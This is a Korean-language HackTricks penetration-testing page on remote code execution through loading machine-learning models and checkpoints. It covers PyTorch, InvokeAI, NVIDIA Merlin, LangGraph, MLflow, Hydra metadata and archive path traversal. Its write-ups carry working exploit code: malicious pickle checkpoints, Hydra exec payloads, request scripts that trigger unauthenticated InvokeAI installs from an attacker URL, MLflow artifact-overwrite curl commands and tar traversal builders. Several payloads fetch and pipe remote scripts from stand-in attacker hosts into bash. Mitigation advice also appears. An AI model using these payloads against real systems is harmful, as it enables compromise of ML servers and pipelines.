# Models RCE

{{#include ../banners/hacktricks-training.md}}

## 모델 로드를 통한 RCE

Machine Learning 모델은 보통 ONNX, TensorFlow, PyTorch 등 다양한 형식으로 공유됩니다. 개발자 머신이나 production 시스템에서 사용하기 위해 이러한 모델을 로드할 수 있습니다. 일반적으로 모델에 악성 코드가 포함되어서는 안 되지만, 모델을 의도된 기능으로 사용하거나 모델 로딩 라이브러리의 취약점으로 인해 시스템에서 임의의 코드를 실행할 수 있는 경우가 있습니다.

다음 표에는 이 범주에 속하는 대표적인 취약점이 나와 있습니다.

| **Framework / Tool**        | **취약점 (사용 가능한 경우 CVE)**                                                    | **RCE 벡터**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load`의 안전하지 않은 역직렬화* **(CVE-2025-32434)**                                                              | 악성 pickle이 모델 checkpoint에 포함되어 코드 실행으로 이어짐 (`weights_only` 보호 기능 우회)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF와 악성 모델 다운로드로 코드 실행 유발; management API에서 Java 역직렬화 RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load`를 통한 안전하지 않은 checkpoint 역직렬화 **(CVE-2025-23298)**                                           | 신뢰할 수 없는 checkpoint가 `load_model_trainer_states_from_checkpoint`에서 pickle reducer를 실행해 ML worker에서 코드 실행            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + 안전하지 않은 MessagePack 확장 hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | 사용자 제어 `filter` key로 SQL/JSON-path 구문을 삽입하고, `UNION SELECT`로 가짜 checkpoint row를 생성한 뒤 `msgpack` 역직렬화 과정에서 공격자가 지정한 Python 코드를 import해 호출 | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (안전하지 않은 YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML에서 모델을 로드하면 `yaml.unsafe_load`를 사용해 코드 실행 <br> **Lambda** layer가 포함된 모델을 로드하면 임의의 Python 코드 실행          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite 파싱)                                                                                          | 조작된 `.tflite` 모델이 integer overflow를 유발해 heap corruption 발생 (잠재적 RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load`를 통해 모델을 로드하면 공격자의 `__reduce__` payload가 포함된 pickle이 실행됨                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (안전하지 않은 `np.load`) *논란 있음*                                                                              | `numpy.load`의 기본 설정에서는 pickled object arrays가 허용됨. 악성 `.npy/.npz`가 코드 실행을 유발                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX 모델의 external-weights 경로가 디렉터리 경계를 벗어나 임의의 파일을 읽을 수 있음 <br> 악성 ONNX model tar가 임의의 파일을 덮어쓸 수 있음 (RCE로 이어질 수 있음) | |
| ONNX Runtime (design risk)  | *(CVE 없음)* ONNX custom ops / control flow                                                                                    | custom operator가 포함된 모델은 공격자의 native code를 로드해야 함. 복잡한 모델 그래프가 로직을 악용해 의도치 않은 연산을 실행할 수 있음   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control`이 활성화된 상태에서 model-load API를 사용하면 상대 경로 traversal로 파일을 쓸 수 있음 (예: RCE를 위해 `.bashrc` 덮어쓰기)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (다수의 heap overflow)                                                                         | 잘못된 형식의 GGUF model file이 parser에서 heap buffer overflow를 유발해 피해자 시스템에서 임의 코드 실행 가능                     | |
| **Keras (older formats)**   | *(새 CVE 없음)* Legacy Keras H5 model                                                                                         | Lambda layer가 포함된 악성 HDF5 (`.h5`) 모델은 로드 시 여전히 코드를 실행함 (Keras safe_mode는 구형 형식에 적용되지 않음 – “downgrade attack”) | |
| **Others** (general)        | *설계 결함* – Pickle serialization                                                                                         | pickle 기반 모델 형식이나 Python `pickle.load` 등 많은 ML 도구는 완화 조치가 없으면 모델 파일에 삽입된 임의 코드를 실행함 | |
| **NeMo / uni2TS / FlexTok (Hydra)** | 신뢰할 수 없는 metadata가 `hydra.utils.instantiate()`에 전달됨 **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | 공격자가 제어하는 모델 metadata/config가 `_target_`을 임의의 callable(예: `builtins.exec`)로 설정해 “안전한” 형식(`.safetensors`, `.nemo`, repo `config.json`)에서도 로드 중 실행됨 | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

또한 [PyTorch](https://github.com/pytorch/pytorch/security)에서 사용하는 것과 같은 Python pickle 기반 모델 중에는 `weights_only=True`로 로드하지 않을 경우 시스템에서 임의의 코드를 실행할 수 있는 모델이 있습니다. 따라서 pickle 기반 모델은 위 표에 나와 있지 않더라도 이러한 공격 유형에 특히 취약할 수 있습니다.

### pickle 기반 checkpoint의 정적 검사 우회

제한 없는 `pickle.load()`, `joblib.load()` 또는 `torch.load(..., weights_only=False)`를 호출하는 모델 로딩 경로는 단순한 parser가 아니라 코드 실행 sink입니다.<sup>[[22]](#references)</sup> PyTorch 2.6에서는 사용자 지정 pickle module을 지정하지 않으면 `torch.load()`가 기본적으로 `weights_only=True`를 사용합니다. 아래 예제에서 지원되지 않는 객체를 로드하려면 제한 없는 loader를 사용하거나 이 보호 기능을 비활성화한 애플리케이션이 필요합니다.<sup>[[4]](#references)</sup> 정적 scan 결과가 깨끗하더라도 이러한 경계가 달라지는 것은 아닙니다.<sup>[[21]](#references)</sup>

기본 `__reduce__` 기법은 [Python pickle deserialization](../pentesting-web/deserialization/#pickle)을, runtime import 검사는 [Fickling's ML import allowlist](keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling)을 참조하세요.

#### callable을 등록한 다음 `EXT2`로 확인

pickle은 `REDUCE`를 통해 `copyreg.add_extension`을 호출해 공격자가 선택한 숫자 extension code에 module/name 쌍을 등록할 수 있습니다. 이후 `EXT2`가 해당 code를 callable로 확인하고, 다른 `REDUCE`가 이를 호출할 수 있습니다. 따라서 중요한 callable은 `GLOBAL` 또는 `STACK_GLOBAL` opcode의 operand가 아닙니다. Binarly는 `multiprocessing.util.spawnv_passfds`를 사용해 이를 시연했습니다. 평가한 scanner 5개 중 4개가 이를 탐지하지 못했지만 SaferPickle은 탐지했습니다. registry 변경과 `EXT2` 확인은 동일한 unpickling 작업 안에서 발생합니다.<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

이것은 opcode 스케치이지 완전한 checkpoint가 아닙니다. 외부 loader는 주변 pickle stream을 받아들여야 합니다. 위험한 callable을 찾기 위해 `GLOBAL` 피연산자만 검색하는 scanner는 뒤에 이어지는 lookup을 놓칩니다. `EXT2`를 지원하지 않는 scanner는 verdict를 내리기도 전에 실패할 수 있습니다. 엄격한 allowlist는 `copyreg.add_extension` 자체를 거부할 수도 있습니다.<sup>[[21]](#references)</sup>

#### 일반 함수 뒤에 구성된 code-object 유형 숨기기

또 다른 pickle chain은 `type(copy.copy)`에서 `FunctionType`을, `type(copy.copy.__code__)`에서 `CodeType`을 가져온 다음, 제공된 bytecode로 code object를 구성하고 이를 function으로 감싼 뒤 호출할 수 있습니다. 공개된 변형은 `operator.methodcaller('__getattribute__', '__code__')`를 통해 `__code__`를 가져오므로, pickle에서 두 constructor를 이름으로 import할 필요가 없습니다. `CodeType(...)`의 필드 레이아웃과 bytecode는 CPython 버전에 따라 다르므로, 다른 interpreter용으로 만든 payload는 실행 전에 실패할 수 있습니다. SaferPickle은 여전히 시연된 샘플을 탐지했지만, 등급을 `suspicious`로 낮췄습니다. 평가된 다른 네 scanner는 이를 놓쳤습니다.<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### pickle 인수를 통해 두 번째 모델 로드 트리거

외부 pickle은 공격자가 제공한 직렬화된 모델을 인수로 전달해 `torch.storage._load_from_bytes`를 호출할 수 있습니다. 이 함수는 `torch.load(io.BytesIO(b), weights_only=False)`를 호출하므로, 최상위 opcode scanner에는 한 callable에 전달된 bytes로 보이더라도 중첩된 모델은 weights-only 제한 없이 역직렬화됩니다. 외부 pickle이 해당 callable을 허용해야 한다는 점은 여전히 유효합니다. `weights_only=True`라고 해서 외부 pickle이 자동으로 이를 허용하는 것은 아닙니다. 중첩된 bytes를 재귀적으로 검사하지 않는 scanner는 내부의 `GLOBAL`/`REDUCE` 체인을 놓칠 수 있습니다.<sup>[[21]](#references)[[23]](#references)</sup>

#### 로드 시점에 레거시 pickle 모듈 이름 확인

pickle protocol이 3 미만이면 Python의 기본 `fix_imports=True` 설정은 `_compat_pickle.IMPORT_MAPPING`을 통해 `commands.run`에 대한 `GLOBAL` 참조를 `subprocess.run`으로 매핑합니다. 따라서 모듈 문자열을 그대로 `subprocess` denylist와 비교하는 scanner는 런타임 callable을 놓칠 수 있습니다. 이를 악용하려면 호환성 매핑을 유지하고 결과로 만들어진 호출 인수를 허용하는 loader가 필요합니다.<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### ZIP이 아닌 checkpoint를 ZIP 전용 scanner 우회에 사용

opcode 검사와 별개로 형식 선택 과정에서 문제가 발생할 수 있습니다. Binarly는 ModelScan 0.8.8이 `.bin`, `.pt`, `.pth`, `.ckpt` 파일을 ZIP 전용 PyTorch scanner로 전달하고, ZIP이 아닌 pickle stream을 일반 pickle scanner로 넘기지 않고 건너뛴다는 사실을 발견했습니다. 또한 `torch.load()`는 허용하지만 ModelScan과 JFrog는 검사하지 않는 레거시 TAR 모델 레이아웃도 문서화했습니다. 이는 특정 scanner 버전에만 해당하는 공백이며, 모든 모델 scanner의 특성은 아닙니다.<sup>[[21]](#references)</sup>

#### 정적 parser가 잘못된 끝부분에 도달하기 전에 실행

`pickletools.genops()`로 pickle 전체를 순회하는 scanner는 유효한 `REDUCE` 뒤에 잘린 opcode가 있으면 예외를 발생시킬 수 있습니다. 제한 없는 unpickler는 해당 끝부분에 도달하기 전에 callable을 이미 호출한 상태일 수 있으며, 이후 전체 로드에서 예외가 발생하더라도 마찬가지입니다. 보고된 샘플은 실행되는 `REDUCE` 바로 뒤에 잘린 `BINUNICODE`를 배치해, 앞서 파일 쓰기 부작용이 발생한 뒤 `pickletools.genops()`가 실패하도록 했습니다. 이 방법은 scanner가 파싱 오류를 정상으로 처리하거나 파일을 건너뛰는 경우에만 scanner를 우회합니다. 반환된 모델이 성공적으로 생성되지 않아도 부작용이 중요할 때만 유용하며, 로드 완료를 요구하는 대상은 해당 artifact를 거부할 수 있습니다.<sup>[[21]](#references)</sup>

### Hydra metadata → RCE (safetensors에서도 동작)

`hydra.utils.instantiate()`는 설정/metadata 객체에 있는 점으로 구분된 `_target_`을 무엇이든 import하고 호출합니다. Hugging Face Transformers와 같은 라이브러리가 **신뢰할 수 없는 모델 metadata**를 `instantiate()`에 전달하면, 공격자는 모델 로드 중 즉시 실행되는 callable과 인수를 제공할 수 있습니다(pickle은 필요하지 않음).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Payload 예시 (`.nemo`의 `model_config.yaml`, repo의 `config.json`, 또는 `.safetensors` 내부의 `__metadata__`에서 동작):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

핵심 사항:
- NeMo의 `restore_from/from_pretrained`, uni2TS HuggingFace coders, FlexTok loaders에서 모델이 초기화되기 전에 트리거됩니다.
- Hydra의 문자열 block-list는 대체 import 경로(예: `enum.bltns.eval`)나 애플리케이션에서 해석한 이름(예: `nemo.core.classes.common.os.system` → `posix`)을 통해 우회할 수 있습니다.<sup>[[14]](#references)</sup>
- FlexTok은 문자열로 변환된 메타데이터도 `ast.literal_eval`로 파싱하므로, Hydra 호출 전에 DoS(CPU/메모리 폭증)가 발생할 수 있습니다.

### 🆕  InvokeAI에서 `torch.load`를 통한 RCE (CVE-2024-12029)

`InvokeAI`는 Stable-Diffusion을 위한 인기 있는 오픈 소스 웹 인터페이스입니다. **5.3.1 – 5.4.2** 버전은 사용자가 임의의 URL에서 모델을 다운로드하고 로드할 수 있는 REST endpoint `/api/v2/models/install`을 노출합니다.<sup>[[1]](#references)</sup>

내부적으로 이 endpoint는 결국 다음을 호출합니다:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

사용자가 제공한 파일이 **PyTorch 체크포인트(`*.ckpt`)**인 경우, `torch.load`는 **pickle 역직렬화**를 수행합니다. 콘텐츠가 사용자가 제어하는 URL에서 직접 전달되므로, 공격자는 체크포인트에 사용자 지정 `__reduce__` 메서드가 포함된 악성 객체를 삽입할 수 있습니다. 이 메서드는 **역직렬화 중에 실행**되어 InvokeAI 서버에서 **원격 코드 실행(RCE)**을 유발합니다.

이 취약점에는 **CVE-2024-12029**가 할당되었습니다(CVSS 9.8, EPSS 61.17 %).

#### 악용 단계별 설명

1. 악성 체크포인트를 생성합니다:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. 제어하는 HTTP 서버에 `payload.ckpt`를 호스팅합니다(예: `http://ATTACKER/payload.ckpt`).
3. 취약한 엔드포인트를 트리거합니다(인증 불필요):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. InvokeAI가 파일을 다운로드하면 `torch.load()`를 호출하고 → `os.system` gadget이 실행되어 공격자가 InvokeAI 프로세스의 컨텍스트에서 코드 실행 권한을 얻습니다.

기성 exploit: **Metasploit** 모듈 `exploit/linux/http/invokeai_rce_cve_2024_12029`이 전체 흐름을 자동화합니다.<sup>[[3]](#references)</sup>

#### 조건

•  InvokeAI 5.3.1-5.4.2 (scan flag 기본값 **false**)
•  공격자가 `/api/v2/models/install`에 접근할 수 있음
•  프로세스에 shell 명령을 실행할 권한이 있음

#### 완화 방안

* **InvokeAI ≥ 5.4.3**으로 업그레이드합니다. 패치에서는 기본적으로 `scan=True`를 설정하고 역직렬화 전에 malware scanning을 수행합니다.<sup>[[2]](#references)</sup>
* checkpoint를 프로그래밍 방식으로 로드할 때 `torch.load(file, weights_only=True)` 또는 새 [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper를 사용합니다.
* model source에 allow-list / 서명을 적용하고, 최소 권한으로 서비스를 실행합니다.

> ⚠️ 신뢰할 수 없는 source의 Python pickle 기반 형식(다수의 `.pt`, `.pkl`, `.ckpt`, `.pth` 파일 포함)은 역직렬화할 때 본질적으로 안전하지 않다는 점을 기억하세요.

---

이전 버전의 InvokeAI를 reverse proxy 뒤에서 계속 실행해야 하는 경우 사용할 수 있는 임시 완화 방안 예시:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA의 Transformers4Rec(Merlin의 일부)는 사용자가 제공한 경로에 대해 `torch.load()`를 직접 호출하는 안전하지 않은 checkpoint loader를 노출했습니다. `torch.load`는 Python `pickle`에 의존하므로, 공격자가 제어하는 checkpoint는 역직렬화 중 reducer를 통해 임의의 코드를 실행할 수 있습니다.<sup>[[5]](#references)</sup>

취약한 경로(수정 전): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

RCE로 이어지는 이유: Python pickle에서 객체는 callable과 인수를 반환하는 reducer (`__reduce__`/`__setstate__`)를 정의할 수 있습니다. Unpickling 중에 해당 callable이 실행됩니다. 이러한 객체가 checkpoint에 있으면, 가중치가 사용되기 전에 코드가 실행됩니다.

최소 악성 checkpoint 예제:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

전달 벡터 및 영향 범위:
- repos, buckets 또는 artifact registries를 통해 공유되는 트로이목마화된 checkpoints/models
- checkpoints를 자동으로 로드하는 자동화된 resume/deploy 파이프라인
- 실행은 training/inference workers 내부에서 이루어지며, 종종 높은 권한으로 실행됨(예: 컨테이너의 root)

수정: 커밋 [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)(PR #802)에서 직접적인 `torch.load()` 호출을 `transformers4rec/utils/serialization.py`에 구현된 제한적 allow-list 기반 deserializer로 대체했습니다. 새로운 loader는 타입/필드를 검증하고 로드 중 임의의 callable이 호출되지 않도록 방지합니다.<sup>[[7]](#references)</sup>

PyTorch checkpoints에 관한 방어 지침:
- 신뢰할 수 없는 데이터를 unpickle하지 마세요. 가능하면 [Safetensors](https://huggingface.co/docs/safetensors/index) 또는 ONNX처럼 실행되지 않는 형식을 사용하세요.
- PyTorch serialization을 사용해야 한다면 `weights_only=True`(최신 PyTorch에서 지원)를 사용하거나 Transformers4Rec 패치와 유사한 사용자 지정 allow-list 기반 unpickler를 사용하세요.<sup>[[4]](#references)</sup>
- 모델 provenance/signatures를 강제하고 역직렬화를 sandbox에서 수행하세요(seccomp/AppArmor; non-root 사용자; 제한된 FS 및 네트워크 egress 차단).
- checkpoint 로드 시 ML 서비스에서 예상치 못한 child processes가 생성되는지 모니터링하고, `torch.load()`/`pickle` 사용을 추적하세요.

POC 및 취약점/패치 참조:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- 패치 전 취약한 loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- 악성 checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- 패치 후 loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## 예제 – 악성 PyTorch 모델 제작하기

- 모델 생성:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- 모델 로드:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent의 FaceDetection-DSFD는 사용자 제어 데이터를 역직렬화하는 `resnet` endpoint를 노출합니다. ZDI는 원격 공격자가 피해자가 악성 페이지/파일을 로드하도록 유도하고, 해당 페이지/파일이 조작된 직렬화 blob을 endpoint로 전송하게 한 뒤 `root` 권한으로 역직렬화를 실행해 시스템을 완전히 장악할 수 있음을 확인했습니다.

이 exploit 흐름은 일반적인 pickle 악용 방식과 유사합니다:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

역직렬화 중 접근 가능한 모든 gadget(생성자, `__setstate__`, 프레임워크 콜백 등)은 전송 방식이 HTTP, WebSocket, 또는 감시 중인 디렉터리에 저장된 파일인지와 관계없이 같은 방식으로 무기화할 수 있습니다.



### LangGraph checkpointer SQLi → MessagePack RCE

이 공격 체인이 흥미로운 이유는 공격자가 **악성 모델 파일을 업로드할 필요가 없기 때문입니다**. 대신 애플리케이션이 **AI 에이전트 지속성 API**(`get_state_history(..., filter=...)`)를 노출하고, 사용자 입력이 checkpointer 쿼리 빌더에 도달합니다.

#### 1. 메타데이터 필터의 구조적 SQLi

취약한 SQLite 패턴은 다음과 같았습니다:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

값은 나중에 바인딩되지만, `query_key`는 **JSON path 문자열**에 연결되므로, dictionary key 안의 `'`가 `'$.{query_key}'`를 벗어나 SQL을 주입합니다. 같은 교훈은 **JSON paths, identifiers, operators, `LIMIT`, TTL fields**에도 적용됩니다. placeholder는 값만 보호할 뿐, 쿼리의 구조적 구문은 보호하지 않습니다.

#### 2. `UNION SELECT`는 데이터 탈취뿐 아니라 후속 sink도 겨냥할 수 있습니다

쿼리는 `type`과 직렬화된 `checkpoint` 바이트를 반환하며, 이는 나중에 다음과 같이 사용됩니다:

```python
self.serde.loads_typed((type, checkpoint))
```

즉, `WHERE` 절의 SQLi를 통해 **가짜 결과 행**을 삽입할 수 있습니다:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

나중에 코드가 선택된 열을 파싱, 역직렬화, 기록 또는 실행한다면 해당 열을 각각의 sink와 연결하세요. 이 경우 가짜 행은 SQLi를 **공격자가 제어하는 역직렬화**로 바꿉니다.

#### 3. 안전하지 않은 MessagePack 확장 hook은 코드 gadget과 동일합니다

LangGraph의 `msgpack` 경로는 중첩된 튜플을 unpack하고 다음을 실행하는 사용자 지정 확장 hook을 사용했습니다:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

따라서 `("os", "system", "id > /tmp/pwned")`와 동등한 내용을 인코딩하는 MessagePack 확장 객체는 `os`를 import하고, `system`을 찾은 다음 명령을 실행합니다. AI 프레임워크를 검토할 때는 동적 import, reflection 또는 임의 callable 디스패치를 수행하는 **custom MessagePack/JSON/pickle revivers**를 살펴보세요.

#### 4. 에이전트 프레임워크의 실용적인 감사 패턴

사용자가 제어하는 입력이 다음에 도달하는지 검토하세요.
- state history / memory / replay / checkpoint listing API
- SQL 또는 Redis 쿼리 조각을 생성하는 구조화된 필터 빌더
- custom deserializer (`pickle`, `msgpack`, `json` object hook, YAML constructor)
- persistence layer가 반환한 행을 신뢰하는 recovery 경로

이 특정 체인은 신뢰할 수 없는 사용자가 `filter`를 제어할 수 있는 self-hosted LangGraph 배포 환경에서 **SQLite** 또는 **Redis** checkpointer를 사용할 때 영향을 미쳤습니다. 공개 자료에 명시된 패치 버전은 `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, `langgraph-checkpoint 4.0.1+`입니다.<sup>[[15]](#references)</sup>

### MLflow PyFunc artifact 덮어쓰기를 통한 pickle RCE

`PythonModel`로 생성한 MLflow PyFunc는 직렬화된 객체를 `python_model.pkl`로 저장할 수 있습니다. 모델 메타데이터는 `mlflow.pyfunc.model`을 로더로 지정하며, MLflow 구현은 저장된 Python 모델에 이 파일 이름을 사용합니다. 따라서 artifact store에 쓰기 권한이 있으면, 나중에 모델을 로드하는 다른 애플리케이션에서 코드 실행이 발생할 수 있습니다.<sup>[[17]](#references)[[18]](#references)</sup>

유효한 체인은 **artifact 쓰기 권한 → pickle 교체 → 추론 소비자가 다시 로드하도록 유도**하는 것입니다. 프록시된 `mlflow-artifacts:/...` 루트를 사용하는 실험이라면, 실험, 실행 및 모델 artifact 경로를 열거하세요. tracking server는 `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`에서 `GET` 및 `PUT`을 노출합니다.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

최소한의 reducer는 consumer가 artifact를 unpickle하는 즉시 명령을 실행할 수 있습니다. `MLmodel`에 선언된 Python 버전으로 payload를 생성하면 호환성 문제를 피할 수 있습니다.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

기존 모델을 **로드**하는 작업(예: prediction, scoring 또는 deployment)을 트리거하세요. 먼저 재학습하지 마세요. 재학습 과정에서 악성 artifact가 새로운 모델로 대체될 수 있습니다. 애플리케이션 오류가 발생해도 exploit이 불가능하다는 뜻은 아닙니다. reducer가 사용 가능한 모델 대신 명령의 정수 종료 상태를 반환하기 때문입니다. 먼저 ICMP 또는 HTTP callback처럼 관찰 가능한 부작용을 확인한 다음, 최종 payload로 교체하세요.<sup>[[20]](#references)</sup>

평가 중에는 run을 생성할 권한과 다른 run에 속한 artifact를 덮어쓸 권한을 구분하세요. 인증 및 run별 업데이트 권한을 검토하고, 예상치 못한 `python_model.pkl` 수정 사항을 확인하세요. 모델 출처와 무결성도 execution boundary의 일부로 다루세요. 현재 MLflow 코드에서는 `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` 설정도 지원하며, cloudpickle 데이터를 로드하는 대신 models-from-code artifact를 사용할 것을 권장합니다.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### 노출된 model server와 ML 인프라

악성 모델을 로드하는 것만이 ML 인프라에서 코드를 실행하는 방법은 아닙니다. Job submission API, code-validation endpoint, self-hosted AI 서비스의 model registry pull을 통해 모델 파일 없이도 코드 실행으로 이어질 수 있습니다. [노출된 Self-Hosted AI 서비스](AI-Exposed-Self-Hosted-AI-Services.md)를 참조하세요.

## 모델을 이용한 Path Traversal

[**이 블로그 게시물**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)에서 언급했듯이, 다양한 AI 프레임워크에서 사용되는 대부분의 모델 형식은 일반적으로 `.zip` 같은 archive를 기반으로 합니다. 따라서 이러한 형식을 악용해 Path Traversal 공격을 수행하고, 모델이 로드되는 시스템의 임의 파일을 읽을 수 있을지도 모릅니다.<sup>[[16]](#references)</sup>

예를 들어, 다음 코드를 사용하면 로드될 때 `/tmp` 디렉터리에 파일을 생성하는 모델을 만들 수 있습니다:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

또는 다음 코드를 사용하면 로드될 때 `/tmp` 디렉터리에 대한 심볼릭 링크를 생성하는 모델을 만들 수 있습니다:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### 심층 분석: Keras .keras 역직렬화 및 gadget hunting

.keras 내부 구조, Lambda-layer RCE, ≤ 3.8에서의 임의 import 문제, 그리고 수정 후 allowlist 내부에서 gadget을 찾는 방법을 집중적으로 다룬 가이드는 다음을 참조하세요:


{{#ref}}
keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec 블로그 – "CVE-2024-12029 – InvokeAI의 신뢰할 수 없는 데이터 역직렬화"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI 패치 커밋 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit 모듈 문서](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load의 보안 고려 사항](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI 블로그 – CVE-2025-23298 NVIDIA Merlin에서 원격 코드 실행 달성](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI 권고문: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec 패치 커밋 b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
